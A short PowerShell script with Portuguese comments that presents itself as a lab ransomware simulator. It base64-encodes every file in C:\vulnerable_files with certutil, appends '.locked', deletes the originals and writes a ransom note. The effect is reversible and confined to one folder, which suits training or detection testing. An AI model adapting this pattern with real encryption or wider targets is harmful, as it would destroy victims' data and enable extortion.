
# Simulador de ransomware (Windows)
# "Criptografa" arquivos em C:\vulnerable_files via base64 (reversível) e gera nota de resgate

$targetDir = "C:\vulnerable_files"
$keyFile = Join-Path $targetDir ".labkey"
$noteFile = Join-Path $targetDir "README_RESCUE.txt"
$ext = ".locked"

if (!(Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }

# Gera chave se não existir (apenas decorativo neste modo)
if (!(Test-Path $keyFile)) {
	$key = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object {[char]$_})
	Set-Content -Path $keyFile -Value $key
}

# Criptografia simulada: base64 com certutil (reversível pelo restore)
Get-ChildItem -Path $targetDir -File -Recurse | Where-Object { $_.Extension -ne $ext -and $_.Name -ne ".labkey" -and $_.Name -ne "README_RESCUE.txt" } | ForEach-Object {
	$in = $_.FullName
	$out = "$in$ext"
	try {
		certutil -f -encode $in $out | Out-Null
		Remove-Item $in -Force
		Add-Content -Path (Join-Path $targetDir ".ransom_log") -Value "Arquivo $in criptografado em $(Get-Date)"
		Start-Sleep -Milliseconds 500
	} catch {
		Write-Host "Falha ao processar $in: $_"
	}
}

@"
SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!
Para restaurar, use o script de restauração. A chave está em $keyFile.
"@ | Set-Content -Path $noteFile -Encoding UTF8
